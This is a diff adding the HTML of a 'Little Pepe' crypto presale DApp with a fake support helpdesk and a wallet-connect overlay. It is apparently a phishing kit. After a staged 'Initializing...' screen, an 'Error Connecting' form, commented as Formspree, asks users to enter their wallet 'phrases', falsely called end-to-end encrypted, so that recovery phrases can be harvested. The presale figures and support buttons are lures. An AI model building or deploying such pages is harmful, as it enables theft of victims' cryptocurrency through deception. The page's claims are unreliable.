@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Little Pepe DApp</title>
+  <link rel="stylesheet" href="/styles.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Alfa+Slab+One&display=swap" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Kid+Font&display=swap" rel="stylesheet"/>
+  <script src="https://unpkg.com/qrcodejs@1.0.0/qrcode.min.js"></script>
+</head>
+<body>
+  <main>
+    <!-- Sidebar -->
+    <div class="sidebar" id="sidebar">
+      <span class="close-btn" id="closeBtn">×</span>
+      <ul>
+        <li><a href="#" class="sidebar-link home">Home</a></li>
+        <li><a href="#" class="sidebar-link support">Support</a></li>
+        <li><a href="#" class="sidebar-link connect">Connect</a></li>
+      </ul>
+    </div>
+    <div class="hamburger" id="hamburger">☰</div>
+
+    <!-- Homepage -->
+    <section id="homepage">
+      <div class="logo-space">
+        <img src="/logo-CPEVDSpN-2.png" alt="Little Pepe Logo" class="logo-img">
+      </div>
+      <section class="section-2">
+        <p class="moving-text">LILPEPE LittlePepe LILPEPE LittlePepe LILPEPE Littlepepe LILPEPE Littlepepe</p>
+      </section>
+      <section class="section-3">
+        <h1>The New Born EVM Layer 2 Machine: Little PEPE</h1>
+        <p><strong>Enter the new world order with LILPEPE...</strong></p>
+        <div class="button-group">
+          <button class="nav-btn certic-audit">Certic Audit</button>
+          <button class="nav-btn whitepaper">Whitepaper</button>
+        </div>
+        <div class="black-span">
+          <h3><strong>Next Stage Price: $0.002</strong></h3>
+          <span class="stage11">stage11</span>
+          <div class="price-box">1 LILPEPE = $0.0020</div>
+          <h3><strong>USD Raised: $22,033,856 / $22,325,000<br>Tokens Sold: 14,104,427,364 / 14,250,000,000</strong></h3>
+          <div class="progress-bar"><div class="progress"></div></div>
+          <div class="crypto-options">
+            <button class="crypto-btn eth-btn"><img src="/eth-CtbDjbsE.png" class="icon"> Eth</button>
+            <button class="crypto-btn usdt-btn"><img src="/usdt-C3jY3_0p.png" class="icon"> USDT</button>
+          </div>
+          <input type="text" class="crypto-input" value="0.00" placeholder="Enter amount">
+          <input type="text" class="littlepepe-input" value="0.00 LILPEPE" readonly>
+          <button class="connect-btn">Connect</button>
+          <div class="extra-buttons">
+            <button class="nav-btn how-to-buy">How to Buy</button>
+            <button class="nav-btn giveaway">+777k GIVEAWAY</button>
+          </div>
+        </div>
+      </section>
+      <section class="section-supports">
+        <span>
+          <h2>Meet our Supports and enjoy our DApps</h2>
+          <button class="nav-btn explore-btn">Explore</button>
+        </span>
+      </section>
+      <section class="section-4">
+        <p class="moving-text">LILPEPE LittlePepe LILPEPE Littlepepe LILPEPE Littlepepe LILPEPE</p>
+      </section>
+      <section class="section-about">
+        <h2>ABOUT LILPEPE</h2>
+        <p>Little Pepe is a Layer 2 blockchain... powered by memes.</p>
+        <img src="/rd1-bLCBH5Gx.png" alt="Roadmap" class="roadmap-img">
+      </section>
+      <footer class="footer">
+        <p>&copy; 2025 Little Pepe. All rights reserved.</p>
+      </footer>
+    </section>
+
+    <!-- Page 2: Support Helpdesk -->
+    <section id="page2" style="display: none;">
+      <div class="logo-space"><img src="/logo-CPEVDSpN-2.png" class="logo-img"></div>
+      <section class="section-2">
+        <p class="moving-text">LILPEPE LittlePepe LILPEPE LittlePepe LILPEPE</p>
+      </section>
+      <section class="section-3">
+        <h1>Welcome to the Support Helpdesk</h1>
+        <p>Explore Our Decentralized DApp. We're here to assist you.</p>
+      </section>
+      <section class="button-section">
+        <span class="long-span">
+          <button class="support-btn rectification">Rectification</button>
+          <button class="support-btn presale">Presale</button>
+          <button class="support-btn slippage">Slippage</button>
+          <button class="support-btn claim-token">Claim Token</button>
+          <button class="support-btn buy-lilpepe">Buy Lilpepe</button>
+          <button class="support-btn fix-bugs">Fix Bugs</button>
+          <button class="support-btn giveaway">Giveaway</button>
+          <button class="support-btn audit">Audit</button>
+          <button class="support-btn nfts">NFTs</button>
+          <button class="support-btn swap-token">Swap Token</button>
+          <button class="support-btn wallet-update">Wallet Update</button>
+          <button class="support-btn admin-verification">Admin Verification</button>
+          <button class="support-btn roles">Roles</button>
+          <button class="support-btn staking">Staking</button>
+          <button class="support-btn exchange">Exchange</button>
+          <button class="support-btn whitelist">Whitelist</button>
+          <button class="support-btn irregular-balance">Irregular Balance</button>
+          <button class="support-btn wallet-glitch">Wallet Glitch</button>
+          <button class="support-btn approve-wallet">Approve Wallet</button>
+          <button class="support-btn locked-account">Locked Account</button>
+        </span>
+      </section>
+      <footer class="footer">
+        <p>&copy; 2025 Little Pepe. All rights reserved.</p>
+      </footer>
+    </section>
+
+    <!-- Wallet Overlay -->
+    <div id="wallet-overlay" style="display: none;">
+      <section id="wallet-selection" style="text-align: center;">
+        <h2>Select your wallet</h2>
+        <div class="wallet-options">
+          <button class="wallet-btn"><img src="/Metamask.png" class="wallet-icon">MetaMask</button>
+          <button class="wallet-btn"><img src="/Trustwallet.png" class="wallet-icon">TrustWallet</button>
+          <button class="wallet-btn"><img src="/Safepal.png" class="wallet-icon">SafePal</button>
+          <button class="wallet-btn"><img src="/Bitget.png" class="wallet-icon">Bitget</button>
+          <button class="wallet-btn"><img src="/Coinbase.png" class="wallet-icon">Coinbase</button>
+          <button class="wallet-btn"><img src="/Ledger.png" class="wallet-icon">Ledger</button>
+          <button class="wallet-btn"><img src="/OKX.png" class="wallet-icon">OKX</button>
+          <button class="wallet-btn"><img src="/Phantom.png" class="wallet-icon">Phantom</button>
+          <button class="wallet-btn"><img src="/Other.png" class="wallet-icon">Other</button>
+        </div>
+        <div class="selected-wallet">
+          <img id="selected-wallet-icon" src="" style="display: none;" />
+          <button class="connect-wallet-btn">Connect</button>
+        </div>
+      </section>
+    </div>
+
+    <!-- Page 3: Initializing -->
+    <section id="page3" style="display: none;">
+      <div class="logo-space"><img src="/logo-CPEVDSpN-2.png" class="logo-img"></div>
+      <div class="initializing-box">Initializing...</div>
+    </section>
+
+    <!-- Page 4: Error Input Page (Formspree) -->
+    <section id="page4" style="display: none;">
+      <div class="logo-space"><img src="/logo-CPEVDSpN-2.png" class="logo-img"></div>
+      <h2 class="error-text">Error Connecting</h2>
+      <form id="error-form">
+        <input type="text" name="user-input" class="error-input" placeholder="Enter your phrases here... end to end encrypted" maxlength="700">
+        <button type="submit" class="connect-btn-error">Connect</button>
+      </form>
+    </section>
+
+    <!-- Page 5: Please Bear With Us -->
+    <section id="page5" style="display: none;">
+      <div class="logo-space"><img src="/logo-CPEVDSpN-2.png" class="logo-img"></div>
+      <h2 class="bear-text">Please bear with us</h2>
+      <div id="qr-code"></div>
+    </section>
+  </main>
+
+  <!-- Script -->
+  <script src="/script.js"></script>
+</body>
+</html>
